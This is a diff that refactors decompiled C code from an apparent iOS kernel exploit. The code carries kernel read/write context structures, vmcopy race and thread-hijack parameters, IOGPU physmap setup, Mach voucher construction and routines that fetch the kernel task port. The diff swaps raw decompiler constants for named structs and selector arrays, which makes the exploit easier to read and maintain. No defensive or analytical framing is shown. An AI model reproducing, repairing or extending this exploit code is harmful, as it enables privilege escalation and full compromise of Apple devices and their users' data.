@@ -1750,6 +1750,15 @@ struct thread_hijack_allocation_candidate
   uint64_t pageCount;
 };
 
+struct mach_voucher_u64_recipe
+{
+  uint32_t key;
+  uint32_t command;
+  uint32_t previousVoucher;
+  uint32_t contentSize;
+  uint64_t content;
+};
+
 static const integer_t kVmcopyRaceLowPriorityPolicy[4] = { 0x20A51, 0x2710, 0x2711, 1 };
 static const integer_t kVmcopyRaceHighPriorityPolicy[4] = { 0x3E8, 0xF4240, 0xF4241, 1 };
 static const uint64_t kVmcopyFakePageMarkers[2] = { 0x43434343, 0x44444444 };
@@ -1762,6 +1771,7 @@ static const struct thread_hijack_allocation_candidate kThreadHijackAllocCandida
   { 0x30000000, 2 },
   { 0x20000000, 0 },
 };
+static const uint32_t kIogpuMachPortSelectors[4] = { 0x15, 0x16, 0x18, 0x19 };
 
 #define SET_IOSURFACE_ALLOC_PAGE_AND_COUNT(dst) \
   do { \
@@ -1923,9 +1933,7 @@ uint16_t dmaFail_sbox[256] = {
 __int128 xmmword_43690 = IDA_INT128_C(0x0000064000000730ULL, 0x0000030000000060ULL); // weak
 __int128 xmmword_436C0 = IDA_INT128_C(0x1000000000000000ULL, 0x0000000000000000ULL); // weak
 unsigned int dword_436F0[4] = { 20u, 32u, 20u, 48u }; // weak
-__int128 xmmword_43710 = IDA_INT128_C(0x0000000800000000ULL, 0x000000D300000007ULL); // weak
 __int128 xmmword_43730 = IDA_INT128_C(0xFFFFFFFFFFFFEFFFULL, 0xFFFF000000000000ULL); // weak
-__int128 xmmword_43740 = IDA_INT128_C(0x0000001900000018ULL, 0x0000001600000015ULL); // weak
 __int128 xmmword_43750 = IDA_INT128_C(0x0000000000000001ULL, 0x0000000000000000ULL); // weak
 __int128 xmmword_43760; // weak
 __int128 unk_43770; // weak
@@ -5265,7 +5273,6 @@ __int64 __fastcall iogpu_physmap_init(struct_krwCtx *krwCtx)
   mem_entry_name_port_t object_handle; // [xsp+Ch] [xbp-94h] BYREF
   vm_address_t address; // [xsp+10h] [xbp-90h] BYREF
   vm_size_t size; // [xsp+18h] [xbp-88h] BYREF
-  __int128 v14; // [xsp+20h] [xbp-80h]
   mach_port_t v15; // [xsp+3Ch] [xbp-64h] BYREF
   __int64 v16; // [xsp+40h] [xbp-60h] BYREF
   uint32_t v17[4]; // [xsp+48h] [xbp-58h]
@@ -5294,8 +5301,7 @@ __int64 __fastcall iogpu_physmap_init(struct_krwCtx *krwCtx)
     v17[1] = HIDWORD(v16);
     v17[2] = v16;
     v17[3] = v15;
-    v14 = xmmword_43740;
-    v6 = iosurface_enum_mach_port(krwCtx, 0x15u);
+    v6 = iosurface_enum_mach_port(krwCtx, kIogpuMachPortSelectors[0]);
     if ( v6 )
     {
       v7 = (uint32_t *)v6;
@@ -5314,7 +5320,7 @@ __int64 __fastcall iogpu_physmap_init(struct_krwCtx *krwCtx)
         *v7 = v9;
         if ( i == 3 )
           break;
-        v7 = (uint32_t *)iosurface_enum_mach_port(krwCtx, *(uint32_t *)((char *)&v14 + i * 4 + 4));
+        v7 = (uint32_t *)iosurface_enum_mach_port(krwCtx, kIogpuMachPortSelectors[i + 1]);
         result = 4097;
         if ( !v7 )
           return result;
@@ -5328,8 +5334,6 @@ __int64 __fastcall iogpu_physmap_init(struct_krwCtx *krwCtx)
   }
   return result;
 }
-// 43740: using guessed type __int128 xmmword_43740;
-
 //----- (000000000000AE58) ----------------------------------------------------
 __int64 __fastcall iogpu_init_private_ctx(
                                           struct_krwCtx *krwCtx,
@@ -5623,7 +5627,6 @@ __int64 __fastcall iogpu_krw_ctx_setup(struct_krwCtx *krwCtx, uint32_t *a2)
   __int64 v16; // x8
   __int64 v17; // x8
   uint64_t v18; // [xsp+18h] [xbp-88h] BYREF
-  __int128 v19; // [xsp+20h] [xbp-80h]
   int v20; // [xsp+3Ch] [xbp-64h] BYREF
   vm_address_t address; // [xsp+40h] [xbp-60h] BYREF
   mem_entry_name_port_t object[4]; // [xsp+48h] [xbp-50h]
@@ -5639,8 +5642,7 @@ __int64 __fastcall iogpu_krw_ctx_setup(struct_krwCtx *krwCtx, uint32_t *a2)
   if ( !(uint32_t)result )
   {
     v6 = 163878;
-    v19 = xmmword_43740;
-    v7 = (mach_port_name_t *)iosurface_enum_mach_port(krwCtx, 0x15u);
+    v7 = (mach_port_name_t *)iosurface_enum_mach_port(krwCtx, kIogpuMachPortSelectors[0]);
     if ( v7 )
     {
       v8 = 0;
@@ -5694,7 +5696,7 @@ __int64 __fastcall iogpu_krw_ctx_setup(struct_krwCtx *krwCtx, uint32_t *a2)
           }
           break;
         }
-        v7 = (mach_port_name_t *)iosurface_enum_mach_port(krwCtx, *(uint32_t *)((char *)&v19 + v8 * 4 + 4));
+        v7 = (mach_port_name_t *)iosurface_enum_mach_port(krwCtx, kIogpuMachPortSelectors[v8 + 1]);
         ++v8;
       }
       while ( v7 );
@@ -5721,8 +5723,6 @@ __int64 __fastcall iogpu_krw_ctx_setup(struct_krwCtx *krwCtx, uint32_t *a2)
   }
   return result;
 }
-// 43740: using guessed type __int128 xmmword_43740;
-
 //----- (000000000000B73C) ----------------------------------------------------
 __int64 __fastcall get_iogpu_physmap_base(struct_krwCtx *krwCtx)
 {
@@ -39421,17 +39421,16 @@ __int64 __fastcall cache_physmap_page_slot(struct_krwCtx *krwCtx, unsigned int a
 bool __fastcall voucher_create_mach_voucher(__int64 a1, __int64 a2, ipc_voucher_t *voucherOut)
 {
   host_t v4; // w0
-  struct {
-    __int128 recipes; // [xsp+0h] [xbp-30h] BYREF
-    __int64 v7; // [xsp+10h] [xbp-20h]
-  } recipe;
+  struct mach_voucher_u64_recipe recipe; // [xsp+0h] [xbp-30h] BYREF
 
-  recipe.recipes = xmmword_43710;
-  recipe.v7 = a2;
+  recipe.key = 7;
+  recipe.command = 0xD3;
+  recipe.previousVoucher = 0;
+  recipe.contentSize = sizeof(recipe.content);
+  recipe.content = a2;
   v4 = mach_host_self();
   return host_create_mach_voucher(v4, (mach_voucher_attr_raw_recipe_array_t)&recipe, 0x18u, voucherOut) == 0;
 }
-// 43710: using guessed type __int128 xmmword_43710;
 
 //----- (000000000003629C) ----------------------------------------------------
 __int64 __fastcall create_mach_port_with_a2(struct_krwCtx *krwCtx, unsigned int a2)
@@ -42928,8 +42927,6 @@ __int64 __fastcall insert_task_port_send_right_versioned(struct_krwCtx *krwCtx, 
   unsigned int v4; // w2
   unsigned int v5; // w4
   bool v6; // zf
-  __int128 v7; // [xsp+0h] [xbp-20h] BYREF
-
   v2 = krwCtx->xnuVersionPacked;
   if ( v2 < XNU_VERSION_PACKED(10002, 60, 75, 0, 3) )
   {
@@ -42946,15 +42943,13 @@ __int64 __fastcall insert_task_port_send_right_versioned(struct_krwCtx *krwCtx, 
   }
   else if ( (krwCtx->flags & 0x20) != 0 )
   {
-    v7 = xmmword_43740;
-    return insert_mach_port_send_right(krwCtx, a2, 4u, (__int64)&v7, 0xFu);
+    return insert_mach_port_send_right(krwCtx, a2, 4u, (__int64)kIogpuMachPortSelectors, 0xFu);
   }
   v4 = 2;
   v5 = 3;
 LABEL_13:
   return insert_mach_port_send_right(krwCtx, a2, v4, 0, v5);
 }
-// 43740: using guessed type __int128 xmmword_43740;
 
 //----- (000000000003A72C) ----------------------------------------------------
 unsigned __int64 __fastcall get_kernel_task_host_port(struct_krwCtx *krwCtx)
